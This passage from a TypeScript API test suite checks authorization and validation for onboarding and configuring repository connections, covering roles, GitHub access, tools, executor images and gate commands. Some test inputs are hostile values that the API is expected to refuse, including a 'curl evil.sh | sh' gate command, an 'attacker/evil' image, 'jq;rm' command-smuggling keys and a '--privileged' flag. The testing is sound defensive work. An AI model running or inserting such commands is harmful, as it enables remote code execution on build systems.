      expect(JSON.parse(res.payload).data.id).toBe(REPO_ID);
      // Identity is (host, owner, name); no override means the instance's host,
      // which a row spelling that host out also is.
      expect(ctx.mockPrisma.connection.findFirst).toHaveBeenCalledWith({
        where: {
          OR: [{ githubUrl: null }, { githubUrl: 'https://github.com' }],
          organizationName: { equals: 'acme', mode: 'insensitive' },
          repoName: { equals: 'widgets', mode: 'insensitive' },
          type: 'git_repo',
        },
      });
      expect(ctx.mockPrisma.connection.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({ githubApiUrl: null, githubUrl: null }),
        })
      );
    });

    it('returns 409 REPO_EXISTS on the friendly pre-check duplicate (no create call)', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce({ id: 'existing-repo' });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_EXISTS');
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('returns 409 REPO_EXISTS (not 500) when create races past the pre-check into a P2002', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockRejectedValueOnce(
        p2002(['organizationName', 'repoName'])
      );

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_EXISTS');
    });

    it('returns 400 VALIDATION_ERROR when a git_repo is missing organizationName/repoName', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { teamId: TEAM_ID, type: 'git_repo' },
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(400);
      expect(JSON.parse(res.payload).error.code).toBe('VALIDATION_ERROR');
      expect(ctx.mockPrisma.team.findUnique).not.toHaveBeenCalled();
    });

    it('returns 400 VALIDATION_ERROR for a PagerDuty fromEmail that is not an email', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {
          config: { fromEmail: 'not-an-email' },
          name: 'PagerDuty',
          teamId: TEAM_ID,
          type: 'pagerduty',
        },
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(400);
      expect(JSON.parse(res.payload).error.message).toContain('fromEmail');
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('returns 404 TEAM_NOT_FOUND when the team is missing or inactive', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(404);
      expect(JSON.parse(res.payload).error.code).toBe('TEAM_NOT_FOUND');
    });

    it('returns 403 for a platform LEAD who does not lead the target team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce(null); // no membership in this team

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('FORBIDDEN');
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('allows a platform ENGINEER who leads the target team', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce({
        role: 'LEAD',
        team: { isActive: true },
      });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(201);
    });

    it('returns 400 for a missing teamId', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { organizationName: 'acme', repoName: 'widgets', type: 'git_repo' },
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 400 for an invalid githubUrl', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { ...validBody, githubUrl: 'not-a-url' },
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 403 for a platform ENGINEER who does not manage the target team', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.mockPrisma.team.findUnique.mockResolvedValue({ id: TEAM_ID, isActive: true });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('returns 401 without auth', async () => {
      const res = await ctx.app.inject({
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(401);
    });

    describe("the caller's own GitHub access", () => {
      const onboardAsTeamLead = () => {
        ctx.authState.role = 'LEAD';
        ctx.authState.sub = 'lead-1';
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce({
          role: 'LEAD',
          team: { isActive: true },
        });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
        return ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: validBody,
          url: '/api/v1/repositories',
        });
      };

      it('is not asked of a platform admin', async () => {
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });

        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: validBody,
          url: '/api/v1/repositories',
        });

        expect(res.statusCode).toBe(201);
        expect(github.verifiedGithubLoginFor).not.toHaveBeenCalled();
        expect(github.lookupRepoPermission).not.toHaveBeenCalled();
      });

      it('lets a team lead who can read the repository on GitHub onboard it', async () => {
        const res = await onboardAsTeamLead();

        expect(res.statusCode).toBe(201);
        expect(github.verifiedGithubLoginFor).toHaveBeenCalledWith(ctx.mockPrisma, 'lead-1');
        expect(github.lookupRepoPermission).toHaveBeenCalledWith(
          {
            githubApiUrl: null,
            githubUrl: null,
            installation: null,
            organizationName: 'acme',
            repoName: 'widgets',
          },
          'octocat'
        );
      });

      it('refuses a team lead GitHub reports has no access (403)', async () => {
        github.lookupRepoPermission.mockResolvedValue({ ok: true, permission: 'none' });

        const res = await onboardAsTeamLead();

        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.code).toBe('GITHUB_ACCESS_UNVERIFIED');
        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
        // Refused before the duplicate check, so the answer says nothing about
        // whether the repository is already onboarded.
        expect(ctx.mockPrisma.connection.findFirst).not.toHaveBeenCalled();
      });

      it('refuses a team lead with no linked GitHub identity (403)', async () => {
        github.verifiedGithubLoginFor.mockResolvedValue(null);

        const res = await onboardAsTeamLead();

        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.code).toBe('GITHUB_ACCESS_UNVERIFIED');
        expect(github.lookupRepoPermission).not.toHaveBeenCalled();
        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
      });

      it('fails closed when GitHub cannot be asked', async () => {
        github.lookupRepoPermission.mockResolvedValue({ failure: 'unavailable', ok: false });
        const outage = await onboardAsTeamLead();
        expect(outage.statusCode).toBe(503);
        expect(JSON.parse(outage.payload).error.code).toBe('GITHUB_UNAVAILABLE');

        github.lookupRepoPermission.mockRejectedValue(new Error('database down'));
        const thrown = await onboardAsTeamLead();
        expect(thrown.statusCode).toBe(503);

        // The platform credential cannot see the repository: not an outage, and
        // not a yes either.
        github.lookupRepoPermission.mockResolvedValue({ failure: 'repo-not-found', ok: false });
        const unseen = await onboardAsTeamLead();
        expect(unseen.statusCode).toBe(403);
        expect(JSON.parse(unseen.payload).error.code).toBe('GITHUB_ACCESS_UNVERIFIED');

        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
      });
    });
  });

  describe('tool settings', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const asTeamLead = () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role: 'LEAD',
        team: { isActive: true },
      });
    };
    const stored = (over: Record<string, unknown> = {}) => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
        tools: null,
        toolsDeny: [],
        toolsFileEnabled: false,
        ...over,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
    };
    const written = (): Record<string, unknown> => {
      const call = ctx.mockPrisma.connection.update.mock.calls.at(-1);
      const arg = call?.[0] as { data: Record<string, unknown> } | undefined;
      return arg?.data ?? {};
    };

    it('lets an admin set each field and audits before and after', async () => {
      stored({ tools: [{ key: 'jq' }], toolsDeny: ['yq'] });
      const res = await patch({
        tools: [{ key: 'ripgrep', version: '14.1.0' }],
        toolsDeny: ['shellcheck', 'shellcheck', 'yq'],
        toolsFileEnabled: true,
      });
      expect(res.statusCode).toBe(200);
      expect(written()).toMatchObject({
        tools: [{ key: 'ripgrep', version: '14.1.0' }],
        toolsDeny: ['shellcheck', 'yq'],
        toolsFileEnabled: true,
      });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          afterJson: {
            tools: [{ key: 'ripgrep', version: '14.1.0' }],
            toolsDeny: ['shellcheck', 'yq'],
            toolsFileEnabled: true,
          },
          beforeJson: { tools: [{ key: 'jq' }], toolsDeny: ['yq'], toolsFileEnabled: false },
          entityId: REPO_ID,
          entityType: 'Connection',
        }),
      });
    });

    it.each([
      ['tools', { tools: [{ key: 'jq' }] }],
      ['toolsDeny', { toolsDeny: ['jq'] }],
      ['toolsFileEnabled', { toolsFileEnabled: true }],
    ])('refuses a team lead changing %s and writes nothing', async (_name, payload) => {
      asTeamLead();
      stored();
      const res = await patch(payload);
      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('TOOLS_CONFIG_NOT_ALLOWED');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
      expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
    });

    describe('repository identity and the tools file switch', () => {
      // Moving the repository to another team is an identity change that needs no settings read.
      const OTHER_TEAM = '44444444-4444-4444-8444-444444444444';
      const REPOINT = { teamId: OTHER_TEAM };
      beforeEach(() => {
        ctx.mockPrisma.team.findUnique.mockResolvedValue({ isActive: true, orgId: 'org-1' });
        ctx.mockPrisma.knowledgeItem.count.mockResolvedValue(0);
      });

      it('clears toolsFileEnabled, with an audit entry, when a lead moves the repository to another team', async () => {
        asTeamLead();
        stored({ toolsFileEnabled: true });
        const res = await patch(REPOINT);
        expect(res.statusCode, res.payload).toBe(200);
        expect(written()).toMatchObject({ toolsFileEnabled: false });
        expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
          data: expect.objectContaining({
            afterJson: expect.objectContaining({ toolsFileEnabled: false }),
            beforeJson: { toolsFileEnabled: true },
            entityId: REPO_ID,
          }),
        });
      });

      it('keeps toolsFileEnabled when an admin moves the repository to another team', async () => {
        stored({ toolsFileEnabled: true });
        const res = await patch(REPOINT);
        expect(res.statusCode, res.payload).toBe(200);
        expect(written()).not.toHaveProperty('toolsFileEnabled');
        expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
      });

      it('keeps toolsFileEnabled when a lead re-sends the same identity', async () => {
        asTeamLead();
        stored({ toolsFileEnabled: true });
        const res = await patch({ description: 'edited', teamId: TEAM_ID });
        expect(res.statusCode, res.payload).toBe(200);
        expect(written()).not.toHaveProperty('toolsFileEnabled');
        expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
      });

      it('clears toolsFileEnabled when a lead changes the default branch the file is read from', async () => {
        asTeamLead();
        stored({ defaultBranch: 'main', toolsFileEnabled: true });
        const res = await patch({ defaultBranch: 'unvetted' });
        expect(res.statusCode, res.payload).toBe(200);
        expect(written()).toMatchObject({ toolsFileEnabled: false });
      });

      it('keeps toolsFileEnabled when a lead re-sends the same default branch', async () => {
        asTeamLead();
        stored({ defaultBranch: 'main', toolsFileEnabled: true });
        const res = await patch({ defaultBranch: 'main' });
        expect(res.statusCode, res.payload).toBe(200);
        expect(written()).not.toHaveProperty('toolsFileEnabled');
      });

      it('writes nothing extra when the flag is already off', async () => {
        asTeamLead();
        stored({ toolsFileEnabled: false });
        const res = await patch(REPOINT);
        expect(res.statusCode, res.payload).toBe(200);
        expect(written()).not.toHaveProperty('toolsFileEnabled');
      });
    });

    it('lets a team lead re-send unchanged values as a no-op', async () => {
      asTeamLead();
      stored({ tools: [{ key: 'jq' }], toolsDeny: ['yq', 'ripgrep'], toolsFileEnabled: true });
      const res = await patch({
        description: 'edited',
        tools: [{ key: 'jq' }],
        toolsDeny: ['ripgrep', 'yq'],
        toolsFileEnabled: true,
      });
      expect(res.statusCode).toBe(200);
      expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
    });

    it.each([
      ['an uppercase key', { tools: [{ key: 'JQ' }] }],
      ['a key with a semicolon', { tools: [{ key: 'jq;rm' }] }],
      ['a denied key with a semicolon', { toolsDeny: ['jq;rm'] }],
      ['a repeated key', { tools: [{ key: 'jq' }, { key: 'jq', version: '1.7.1' }] }],
      [
        'more than 32 tools',
        { tools: Array.from({ length: 33 }, (_, i) => ({ key: `tool-${i}` })) },
      ],
    ])('rejects %s with 400', async (_name, payload) => {
      stored();
      const res = await patch(payload);
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('clears the declared tools with null', async () => {
      stored({ tools: [{ key: 'jq' }] });
      const res = await patch({ tools: null });
      expect(res.statusCode).toBe(200);
      expect(written().tools).toBe(DB_NULL);
    });

    it('refuses a PagerDuty config whose fromEmail is not an email', async () => {
      stored({ type: 'pagerduty' });
      const res = await patch({ config: { fromEmail: 'not-an-email' } });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });
  });

  describe('executor image', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const asTeamLead = () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role: 'LEAD',
        team: { isActive: true },
      });
    };

    it('refuses a team lead any new image: it would hold the credential', async () => {
      asTeamLead();
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });

      const res = await patch({ executorImage: 'attacker/evil:1' });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('EXECUTOR_IMAGE_NOT_ALLOWED');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses a team lead onboarding a repository with an image', async () => {
      asTeamLead();
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {
          executorImage: 'attacker/evil:1',
          organizationName: 'acme',
          repoName: 'api',
          teamId: TEAM_ID,
        },
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(403);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('lets a team lead re-save the image an admin chose, and clear it', async () => {
      asTeamLead();
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: 'registry.acme.dev/custom:2026-10-01',
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const same = await patch({
        description: 'edited',
        executorImage: 'registry.acme.dev/custom:2026-10-01',
      });
      const blank = await patch({ executorImage: '  ' });

      expect(same.statusCode).toBe(200);
      expect(blank.statusCode).toBe(200);
      const cleared = ctx.mockPrisma.connection.update.mock.calls[1]?.[0] as {
        data: { executorImage: unknown };
      };
      expect(cleared.data.executorImage).toBeNull();
    });

    it('lets an admin set image + build together, and clears it on image/build changes', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: 'registry.acme.dev/custom:1',
        executorImageBuild: { stack: 'node', useRepoDockerfile: false },
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
      const BUILD = { stack: 'python', useRepoDockerfile: true };
      const lastData = () =>
        (
          ctx.mockPrisma.connection.update.mock.calls.at(-1) as unknown as [
            { data: Record<string, unknown> },
          ]
        )[0].data;

      const set = await patch({
        executorImage: 'registry.acme.dev/new:1',
        executorImageBuild: BUILD,
      });
      expect(set.statusCode).toBe(200);
      expect(lastData().executorImageBuild).toEqual(BUILD);

      await patch({ executorImageBuild: null });
      expect(lastData().executorImageBuild).toBe(DB_NULL);

      await patch({ executorImage: null });
      expect(lastData().executorImageBuild).toBe(DB_NULL);

      await patch({ executorImage: 'registry.acme.dev/other:1' });
      expect(lastData().executorImageBuild).toBe(DB_NULL);

      await patch({ executorImage: 'registry.acme.dev/custom:1' });
      expect('executorImageBuild' in lastData()).toBe(false);
    });

    it('lets a platform admin store a node-browser executor image build', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const build = { stack: 'node-browser', useRepoDockerfile: false };
      const res = await patch({
        executorImage: 'registry.acme.dev/executor-node-browser:latest',
        executorImageBuild: build,
      });

      expect(res.statusCode).toBe(200);
      const update = ctx.mockPrisma.connection.update.mock.calls.at(-1) as unknown as [
        { data: { executorImageBuild: unknown } },
      ];
      expect(update[0].data.executorImageBuild).toEqual(build);
    });

    it('refuses a non-admin setting a build, but allows clearing one', async () => {
      asTeamLead();
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const denied = await patch({
        executorImageBuild: { stack: 'node', useRepoDockerfile: false },
      });
      expect(denied.statusCode).toBe(403);
      expect(JSON.parse(denied.payload).error.code).toBe('EXECUTOR_IMAGE_NOT_ALLOWED');

      const cleared = await patch({ executorImageBuild: null });
      expect(cleared.statusCode).toBe(200);
    });

    it('lets a platform admin set any image reference, but not a malformed one', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const ok = await patch({ executorImage: 'registry.acme.dev/custom:2026-10-01' });
      const bad = await patch({ executorImage: 'node:26 --privileged' });

      expect(ok.statusCode).toBe(200);
      expect(bad.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalledTimes(1);
    });
  });

  describe('deactivating a repository', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const arrange = () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        id: REPO_ID,
        teamId: TEAM_ID,
      });
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
    };

    it('starts a disarm sweep for the repository, and not for other updates', async () => {
      arrange();
      ctx.mockPrisma.prEvaluation.findMany
        .mockResolvedValueOnce([{ connectionId: REPO_ID, prNumber: 3 }])
        .mockResolvedValueOnce([
          { closedAt: null, connectionId: REPO_ID, mergedAt: null, prNumber: 3 },
        ]);
      expect((await patch({ isActive: false })).statusCode).toBe(200);
      expect(ctx.mockTemporal.startPrEvaluationWorkflow.mock.calls.map((c) => c[1])).toEqual([
        { connectionId: REPO_ID, prNumber: 3, trigger: 'disarm-sweep' },
      ]);
      ctx.mockTemporal.startPrEvaluationWorkflow.mockClear();
      expect((await patch({ description: 'x' })).statusCode).toBe(200);
      expect((await patch({ isActive: true })).statusCode).toBe(200);
      expect(ctx.mockTemporal.startPrEvaluationWorkflow).not.toHaveBeenCalled();
    });

    it('still answers 200 when the sweep cannot read the database', async () => {
      arrange();
      ctx.mockPrisma.prEvaluation.findMany.mockRejectedValue(new Error('db down'));
      expect((await patch({ isActive: false })).statusCode).toBe(200);
    });
  });

  describe('gate commands', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const asTeamMember = (role: 'LEAD' | 'ADMIN') => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role,
        team: { isActive: true },
      });
    };
    const stored = (gateCommands: unknown, type = 'git_repo') =>
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        executorImage: null,
        gateCommands,
        id: REPO_ID,
        teamId: TEAM_ID,
        type,
      });
    const written = (): Record<string, unknown> => {
      const call = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as
        | { data: Record<string, unknown> }
        | undefined;
      if (!call) {
        throw new Error('expected an update');
      }
      return call.data;
    };

    beforeEach(() => {
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
    });

    it('refuses a team lead a new command: it runs in every run on the repository', async () => {
      asTeamMember('LEAD');
      stored(null);
      const res = await patch({ gateCommands: { runTests: 'curl evil.sh | sh' } });
      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error).toEqual({
        code: 'GATE_COMMANDS_FORBIDDEN',
        message: "Changing a repository's gate commands requires team-admin role",
      });
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses a team lead clearing the commands an admin set', async () => {
      asTeamMember('LEAD');
      stored({ runTests: 'npm test' });
      const res = await patch({ gateCommands: null });
      expect(res.statusCode).toBe(403);
    });

    it('lets a team lead re-save the stored commands with an edit elsewhere', async () => {
      asTeamMember('LEAD');
      stored({ runLint: 'npm run lint', runTests: 'npm test' });
      const res = await patch({
        description: 'edited',
        gateCommands: { runBuild: '  ', runLint: 'npm run lint', runTests: 'npm test' },
      });
      expect(res.statusCode).toBe(200);
      expect(written()).not.toHaveProperty('gateCommands');
      expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
    });

    it('lets a team admin set them, dropping blank gates, and audits the change', async () => {
      asTeamMember('ADMIN');
      stored({ runTests: 'npm test' });
      const res = await patch({
        gateCommands: { runBuild: '', runLint: 'pnpm lint', runTests: null },
      });
      expect(res.statusCode).toBe(200);
      expect(written().gateCommands).toEqual({ runLint: 'pnpm lint' });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          action: 'UPDATE',
          actorId: 'lead-1',
          afterJson: { gateCommands: { runLint: 'pnpm lint' } },
          beforeJson: { gateCommands: { runTests: 'npm test' } },
          entityId: REPO_ID,
          entityType: 'Connection',
        }),
      });
    });

    it('stores a cleared set as null', async () => {
      stored({ runTests: 'npm test' });
      const res = await patch({ gateCommands: {} });
      expect(res.statusCode).toBe(200);
      expect(written().gateCommands).toBe(DB_NULL);
    });

    describe('onboarding with gate commands', () => {
      const onboard = (gateCommands: unknown) => {
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockImplementationOnce(
          async ({ data }: { data: Record<string, unknown> }) => ({ ...data, id: REPO_ID })
        );
        return ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: { gateCommands, organizationName: 'acme', repoName: 'widgets', teamId: TEAM_ID },
          url: '/api/v1/repositories',
        });
      };
      const created = () =>
        (ctx.mockPrisma.connection.create.mock.calls.at(-1)?.[0] ?? { data: {} }) as {
          data: Record<string, unknown>;
        };

      it('refuses a team lead who is not the team admin', async () => {
        asTeamMember('LEAD');
        const res = await onboard({ runTests: 'npm test' });
        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.code).toBe('GATE_COMMANDS_FORBIDDEN');
        expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
      });

      it('lets a team lead onboard with none, or with only blank ones', async () => {
        asTeamMember('LEAD');
        const res = await onboard({ runLint: '  ', runTests: null });
        expect(res.statusCode, res.payload).toBe(201);
        expect(created().data).not.toHaveProperty('gateCommands');
        expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
      });

      it('stores them for a team admin and audits them', async () => {
        asTeamMember('ADMIN');
        const res = await onboard({ runLint: '', runTests: 'npm test' });
        expect(res.statusCode, res.payload).toBe(201);
        expect(created().data.gateCommands).toEqual({ runTests: 'npm test' });
        expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
          data: expect.objectContaining({
            action: 'CREATE',
            afterJson: { gateCommands: { runTests: 'npm test' } },
            entityId: REPO_ID,
            entityType: 'Connection',
          }),
        });
      });
    });

    describe('moving the repository to another team', () => {
      const DEST = '44444444-4444-4444-8444-444444444444';
      const memberships = (dest: 'LEAD' | 'ADMIN') => {
        ctx.authState.role = 'LEAD';
        ctx.authState.sub = 'lead-1';
        ctx.mockPrisma.teamMembership.findUnique.mockImplementation(
          async ({ where }: { where: { userId_teamId: { teamId: string } } }) => ({
            role: where.userId_teamId.teamId === DEST ? dest : 'LEAD',
            team: { isActive: true },
          })
        );
        ctx.mockPrisma.team.findUnique.mockResolvedValue({ isActive: true, orgId: null });
      };

      it('refuses a lead of the destination who is not its admin when commands go with it', async () => {
        memberships('LEAD');
        stored({ runTests: 'npm test' });
        const res = await patch({ teamId: DEST });
        expect(res.statusCode).toBe(403);
        expect(JSON.parse(res.payload).error.message).toBe(
          'Moving a repository with gate commands requires team-admin role in the target team'
        );
        expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
      });

      it('lets an admin of the destination move it with its commands', async () => {
        memberships('ADMIN');
        stored({ runTests: 'npm test' });
        const res = await patch({ teamId: DEST });
        expect(res.statusCode, res.payload).toBe(200);
      });

      it('lets a lead move a repository that has no gate commands', async () => {
        memberships('LEAD');
        stored(null);
        const res = await patch({ teamId: DEST });
        expect(res.statusCode, res.payload).toBe(200);
      });
    });

    it('refuses an unknown gate, and gate commands on a connection that is not a repository', async () => {
      stored(null);
      const unknown = await patch({ gateCommands: { runDeploy: 'make deploy' } });
      expect(unknown.statusCode).toBe(400);

      stored(null, 'notion');
      const notGit = await patch({ gateCommands: { runTests: 'npm test' } });
      expect(notGit.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });
  });

  describe('app preview configuration', () => {
    const recipe = { readyUrl: 'http://localhost:3000/health', start: 'npm run dev' };
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const asTeamMember = (role: 'LEAD' | 'ADMIN') => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role,
        team: { isActive: true },
      });
    };
    const stored = (previewConfig: unknown, type = 'git_repo') =>
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        apiKeyCiphertext: null,
        config: null,
        executorImage: null,
        executorImageBuild: null,
        gateCommands: null,
        githubApiUrl: null,
        githubUrl: null,
        id: REPO_ID,
        installation: null,
        installationId: null,
        organizationName: 'acme',
        previewConfig,
        repoName: 'widgets',
        teamId: TEAM_ID,
        type,
      });
    const onboard = (previewConfig: unknown) => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockImplementationOnce(
        async ({ data }: { data: Record<string, unknown> }) => ({ ...data, id: REPO_ID })
